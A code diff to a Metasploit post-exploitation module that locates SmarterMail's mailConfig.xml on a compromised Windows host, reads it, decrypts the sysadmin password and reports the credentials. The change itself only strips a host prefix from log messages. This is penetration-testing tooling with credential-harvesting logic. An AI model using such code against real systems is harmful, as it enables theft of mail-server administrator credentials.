@@ -90,7 +90,7 @@ class MetasploitModule < Msf::Post
 
     ['Program Files (x86)', 'Program Files'].each do |program_dir|
       path = %(#{system_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml).strip
-      vprint_status "#{peer} - Checking for SmarterMail config file: #{path}"
+      vprint_status "Checking for SmarterMail config file: #{path}"
       if file?(path)
         found_path = path
         break
@@ -107,16 +107,16 @@ class MetasploitModule < Msf::Post
     result = {}
     data = ''
 
-    vprint_status "#{peer} - Retrieving SmarterMail sysadmin password"
+    vprint_status "Retrieving SmarterMail sysadmin password"
     begin
       data = read_file(path)
     rescue Rex::Post::Meterpreter::RequestError => e
-      print_error "#{peer} - Failed to download #{path} - #{e}"
+      print_error "Failed to download #{path} - #{e}"
       return result
     end
 
     if data.blank?
-      print_error "#{peer} - Configuration file is empty."
+      print_error "Configuration file is empty."
       return result
     end
 
@@ -178,14 +178,14 @@ class MetasploitModule < Msf::Post
     # check for SmartMail config file
     config_path = mail_config_path
     if config_path.blank?
-      print_error "#{peer} - Could not find SmarterMail config file"
+      print_error "Could not find SmarterMail config file"
       return
     end
 
     # retrieve username and decrypted password from config file
     result = get_smartermail_creds(config_path)
     if result[:password].nil?
-      print_error "#{peer} - Could not decrypt password string"
+      print_error "Could not decrypt password string"
       return
     end
 
@@ -195,7 +195,7 @@ class MetasploitModule < Msf::Post
     pass = result[:password]
     type = result[:private_type]
     format = result[:jtr_format]
-    print_good "#{peer} - Found Username: '#{user}' Password: '#{pass}'"
+    print_good "Found Username: '#{user}' Password: '#{pass}'"
 
     report_cred(
       ip: rhost,
